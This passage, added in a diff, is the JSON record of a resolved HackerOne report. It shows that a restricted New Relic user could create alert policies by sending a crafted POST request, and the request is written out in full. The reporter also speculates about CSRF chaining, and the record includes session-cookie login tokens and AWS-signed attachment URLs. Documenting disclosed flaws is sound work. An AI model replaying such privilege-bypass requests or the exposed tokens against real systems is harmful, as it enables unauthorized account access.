@@ -1,0 +1,438 @@
+{
+  "id": 380413,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODA0MTM=",
+  "url": "https://hackerone.com/reports/380413",
+  "title": "Restricted user can bypass permissions restriction to create NR Alert policies",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-11T04:57:48.227Z",
+  "submitted_at": "2018-07-11T04:57:48.227Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jon_bottarini",
+    "url": "/jon_bottarini",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-04T11:00:07.925Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-20T02:43:23.185Z",
+  "team_member_agreed_on_going_public_at": "2020-09-04T11:00:07.704Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "So this one is similar to my other privilege escalation issues, but it comes with a sidenote which may lead to some more interesting issues if you feel like digging into it. \n\n**Issue:** User with read only privileges can create NR Alert policies through POST request to Infrastructure-Data service subdomain\n\n## Description \n\nWhen a restricted user navigates to NR Alerts, they don't have the option to create a new alert policy. This can be bypassed by sending a custom POST request to `infrastructure-data.service.newrelic.com`. \n\n## Steps to Reproduce\n\n1. Create NR Account, from admin account, invite a new user with \"Restricted\" base roles\n2. From the restricted user, login and send the following POST request \n\n```\nPOST /accounts/{ACCOUNT_ID}/policies HTTP/1.1\nHost: infrastructure-data.service.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://infrastructure.newrelic.com/accounts/1523936/settings/alerts/create?policyId=77624\nContent-Type: application/json\nX-Dest: alerting_rest_api\nContent-Length: 83\nOrigin: https://infrastructure.newrelic.com\nCookie: (restricted user cookies) \nDNT: 1\nConnection: close\n\n{\"account_id\":\"1523936\",\"name\":\"restricted_user_made_this,\"rollup_strategy\":\"PER_POLICY\"}\n```\n\nReplace `account_id` with the account ID the restricted user has been invited to. Make sure you're using the restricted user cookies. \n\nNew policy will be created.\n\n__Read further only if you want to read my stream of consciousness around this interesting request__ \n\nThis is more of a hypothetical issue (I know, I know... but hear me out) but I've played around with it and I found it interesting. If you look at the above POST request - it doesn't have the usual NR `XSRF-TOKEN=` included in the request. Infact - the only protection from CSRF that this action has is in the `X-Dest: alerting_rest_api` header. \n\nNow, hypothetically, if we had any [CRLF/HTTP Response Splitting](https://www.acunetix.com/websitesecurity/crlf-injection/) vulnerability, we could essentially perform this CSRF without issue - except that `Content-Type: application/json` is preventing us from doing so, if we try sending the request with `text/plain` encoding, we get this nice little error message:\n\n`<!DOCTYPE html><html><head><title>ERROR</title></head><body><h1>error</h1></body></html>`\n\nFear not - for infact there _is_ a way for browsers to perform this type of `application/json` request - using our good ol' buddy Flash: https://blog.cm2.pw/forging-content-type-header-with-flash/\n\nNow, this is not working, and doesn't matter anyway because we don't have a CRLF vuln, but this was fun to look into and if the day ever comes that I _do_ find a CRLF, I'll come back here and try it out. Maybe it would be wise to put a XSRF token on this request so that doesn't happen :P \n\nCheers!\n\n## Impact\n\nWhen a restricted user navigates to NR Alerts, they don't have the option to create a new alert policy. This can be bypassed by sending a custom POST request to `infrastructure-data.service.newrelic.com`.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2020-09-19T02:43:23.227Z",
+  "allow_singular_disclosure_after": -94970435.14280269,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "wi11",
+    "ali",
+    "faizannehal",
+    "prateek_thakare",
+    "cryptographer"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 6454,
+    "asset_type": "URL",
+    "asset_identifier": "alerts.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3028829,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The payload above is missing a \", it should be:\n\n`{\"account_id\":\"1523936\",\"name\":\"restricted_user_made_this\",\"rollup_strategy\":\"PER_POLICY\"}`\n\nSorry! ",
+      "automated_response": false,
+      "created_at": "2018-07-11T06:16:14.353Z",
+      "updated_at": "2018-07-11T06:16:14.353Z",
+      "actor": {
+        "username": "jon_bottarini",
+        "cleared": true,
+        "verified": true,
+        "url": "/jon_bottarini",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 3052799,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jon_bottarini! Sorry for the delay. I'll be looking at this today. ",
+      "automated_response": false,
+      "created_at": "2018-07-16T17:20:21.354Z",
+      "updated_at": "2018-07-16T17:20:21.354Z",
+      "actor": {
+        "username": "alorimer",
+        "cleared": false,
+        "verified": false,
+        "url": "/alorimer",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 3058564,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @jon_bottarini,\n\nI'm having trouble reproducing this issue. When I follow the steps you provided I get a bad request error. I'm using Firefox. \n\nAre there any additional details you can provide that could help me reproduce the issue? \n\nThanks, \nAnna",
+      "automated_response": false,
+      "created_at": "2018-07-17T19:08:54.959Z",
+      "updated_at": "2018-07-17T19:08:54.959Z",
+      "actor": {
+        "username": "alorimer",
+        "cleared": false,
+        "verified": false,
+        "url": "/alorimer",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 3089222,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi Anna! Hmm, let's try another way:\n\nMake sure that the restricted user has the following permissions:\n\n{F323838} \n\n1. Login to the restricted user account, navigate here: https://infrastructure.newrelic.com/accounts/YOUR_ACCOUNT_ID/settings/alerts/create?policyId=1\n2. Add a name to the alert condition\n3. Scroll to the bottom where it says \"create a new policy\"\n4. Enter a name for the policy and an email\n5. Turn Burp interceptor on and intercept the request when you click \"Create\" \n6. You'll see the following POST request, send it to repeater: \n\n```\nPOST /accounts/1523936/policies HTTP/1.1\nHost: infrastructure-data.service.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://infrastructure.newrelic.com/accounts/1523936/settings/alerts/create?policyId=1\nContent-Type: application/json\nX-Dest: alerting_rest_api\nContent-Length: 88\nOrigin: https://infrastructure.newrelic.com\nCookie: TSNGUID=6d6a012e-12ca-422b-b2fb-cb9cec590c32; _ga=GA1.2.1822579123.1531007811; optimizelyEndUserId=oeu1531007820026r0.1189207984627535; ajs_user_id=1798917; ajs_group_id=1523936; ajs_anonymous_id=%2250c7bd19-9fd1-4dfb-afef-6bd2ed4a7328%22; hit_signup_confirmation=1; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1531007835508-91286; intercom-lou-cyym0u3i=1; ref_page_url=directorunknown; ref_page_cat=; ref_page_sub_cat=; ei_client_id=5b45889351d5d50016a27da3; __ar_v4=DLQZ5QQWIFBZZM5ECJME6X%3A20180710%3A1%7CI7ZJI4CQMBCNHGOQ27AYQZ%3A20180710%3A2%7CYCNZVXZ6TJDJ3KMJRVGKFH%3A20180710%3A2%7CX524XMXO4FFB5H6B4GWKPS%3A20180723%3A1; __qca=P0-2112584804-1531283605830; cX_S=jjgmq0ri40oklk38; cX_P=jjgmq0rjgrb6f8x0; cX_G=cx%3A2g5pp1nhb9r191fobgy6jokzp9%3Aq918ygf3pkyr; __utma=156379300.1822579123.1531007811.1532407538.1532407538.1; __utmb=156379300.1.10.1532407538; __utmc=156379300; __utmz=156379300.1532407538.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _gid=GA1.2.2019009887.1532407691; intercom-session-cyym0u3i=ZlNDNEdqZXE2Z3MxYzU2eHVnZUQxaWsvUzRtUGhzTGNGclJRUDZTMng4aklEYThuR2d4YzdwclBrTExTMWZndS0tQjVXTEFOR2Y0bUluV1d3Y1lhUXNJdz09--0a41c86c556f15d84367ff9143ce74cf1cc234e5; login_service_login_newrelic_com_tokens=%7B%22token%22%3A+%22ZZCv5eDP7xqJBLwwNfyFm6t%2BQtpDlGJC2GeVmIoPn9plxdS25%2FXyIsrrBamjspcqlz1Vu1mXdIBlKIATJ4aOBiMJbcMhK6w6j5cJ50jqFElgqXJ5tbObZ6nhtINDo%2BY3GVB%2BlYm%2Bjj3sz%2Fop2Jnt9bBxuZf%2B074Rrqfr6mKVdPSXKgVq7elxL41Qny74gP7x%2BVXT9ZUWjQw0UtYYU3BKMdpgmpkn1XcSSOxHQ2yCkGnXxIhKVpJCTS1lIuQb1NzEsnahPC3W6LqIyyDx583jpey5yvIWYeYSidx3dncKeHMrWjDStHnQsrW1ysuNufPd5UYWhix9k%2FKv8cknvE0EaA%3D%3D%22%2C+%22refresh_token%22%3A+%22BdKa39IxG749bqTDEr%2FJJBaLUl3LAkRP%2B3%2BqtHBRTa03%2B5icymrWMmm4Xw%2BcYwp48xJ3POcKGIMw6cRZXDE4j4P%2FusjCHU3y0P5Nu6Kc66h7UKXJaEomw49s%2B1f04WJsSQEB%2BI9kok7HoYb2FpRiPzMtBmodO7jVq%2FPCBL84iyOqAgF0Bn5C5d3eYCgQGNbXPauCix%2BkLG6b3MwCn4WnrRJLCvCRHT9kreZdw41kzNZA%2FCAY8BWH4hNSK3K8L%2F%2FKO8HYZvOonNf0upg8w65YpH1c5sTRH%2BXjSCqiO6yd%2Bn9zlkhD6jFljT%2F11bBS8PzrwlGAI3i1vVS76wEHtlquMw%3D%3D%22%7D; nr_zd_logged_in=true; login_idle_session_timeout={\"lastInteractionAt\":1532408156,\"warningTime\":180,\"lastIdleLimitCheck\":1532407734}\nConnection: close\n\n{\"account_id\":\"1523936\",\"name\":\"restricted user policy\",\"rollup_strategy\":\"PER_POLICY\"}\n```\n\n7. This post request, when sent in repeater, returns the following when successful:\n\n```\n{\"id\":365510,\"account_id\":1523936,\"rollup_strategy\":\"PER_POLICY\",\"name\":\"restricted user policy\",\"enabled\":true,\"default_policy\":false,\"account_policy_id\":286369,\"created_at\":1532408807332,\"updated_at\":1532408807332,\"type\":\"USER\"}\n```\nHere is what the full request in Burp Repeater looks like:\n\n{F323841}\n\n\nLet me know if that works? \n\nThanks! \n",
+      "automated_response": false,
+      "created_at": "2018-07-24T05:11:30.519Z",
+      "updated_at": "2018-07-24T05:11:30.519Z",
+      "actor": {
+        "username": "jon_bottarini",
+        "cleared": true,
+        "verified": true,
+        "url": "/jon_bottarini",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 323841,
+          "filename": "Screen_Shot_2018-07-23_at_10.09.59_PM.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/323/841/c9beca914716e5638626a8b64f783aba21083fd4/Screen_Shot_2018-07-23_at_10.09.59_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-07-23_at_10.09.59_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-07-23_at_10.09.59_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072358Z&X-Amz-Expires=2802&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0bffd0f762c240c38efba1db91c2b2ba2ea45e73efa13e5293d889455d927310"
+        },
+        {
+          "id": 323838,
+          "filename": "Screen_Shot_2018-07-23_at_10.08.08_PM.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/323/838/33b70fa622190c2a29e2d3044ab2c54c7fbb934b/Screen_Shot_2018-07-23_at_10.08.08_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-07-23_at_10.08.08_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-07-23_at_10.08.08_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072358Z&X-Amz-Expires=2802&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e0ff9bca9f8015a52c2ad5d433da6713586c4ea3a155c603390aebf972c53c2d"
+        },
+        {
+          "id": 323837,
+          "filename": "Screen_Shot_2018-07-23_at_10.02.09_PM.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/323/837/6aac94b86941d491bc432c9d00e4dd9c355495a0/Screen_Shot_2018-07-23_at_10.02.09_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-07-23_at_10.02.09_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-07-23_at_10.02.09_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072358Z&X-Amz-Expires=2802&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=447f55bc11594712f34445e8c94c028fa01f25bbb95ae8a90bd4460b5aea4585"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 3094243,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Hi @jon_bottarini! \n\nThank for the extra info. I was able to reproduce the issue and the engineering team has been notified. \n\nWe'll keep you updated on the progress. \n\n-Anna",
+      "automated_response": false,
+      "created_at": "2018-07-24T23:47:36.513Z",
+      "updated_at": "2018-07-24T23:47:36.513Z",
+      "actor": {
+        "url": "/newrelic",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "New Relic"
+        }
+      },
+      "bounty_amount": "500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "newrelic",
+      "collaborator": {
+        "username": "jon_bottarini",
+        "url": "/jon_bottarini"
+      }
+    },
+    {
+      "id": 3094244,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-07-24T23:48:00.492Z",
+      "updated_at": "2018-07-24T23:48:00.492Z",
+      "actor": {
+        "username": "alorimer",
+        "cleared": false,
+        "verified": false,
+        "url": "/alorimer",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 3094247,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Glad to hear that Anna. Enjoy your day. ",
+      "automated_response": false,
+      "created_at": "2018-07-24T23:48:13.090Z",
+      "updated_at": "2018-07-24T23:48:13.090Z",
+      "actor": {
+        "username": "jon_bottarini",
+        "cleared": true,
+        "verified": true,
+        "url": "/jon_bottarini",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 3551448,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hey @jon_bottarini,\n\nThe Infrastructure engineering team has moved onto a different Alerts integration API, where this is no longer an issue. Thanks for the report!\n\n... and also, you know, there's this new API out there. You'll see it in Burp if you create an alert policy from the Infrastructure product—you'll know it's new if the path starts with `/v2/`.",
+      "automated_response": false,
+      "created_at": "2018-10-29T20:15:23.392Z",
+      "updated_at": "2018-10-29T20:15:23.392Z",
+      "actor": {
+        "username": "ahamlin",
+        "cleared": false,
+        "verified": false,
+        "url": "/ahamlin",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "jon_bottarini",
+        "url": "/jon_bottarini"
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 3551544,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "^ you are super great Alex... I know what I’ll be working on  tonight ;) ",
+      "automated_response": false,
+      "created_at": "2018-10-29T20:42:49.775Z",
+      "updated_at": "2018-10-29T20:42:49.775Z",
+      "actor": {
+        "username": "jon_bottarini",
+        "cleared": true,
+        "verified": true,
+        "url": "/jon_bottarini",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8984342,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-20T02:43:23.205Z",
+      "updated_at": "2020-08-20T02:43:23.205Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "jon_bottarini",
+        "cleared": true,
+        "verified": true,
+        "url": "/jon_bottarini",
+        "profile_picture_urls": {
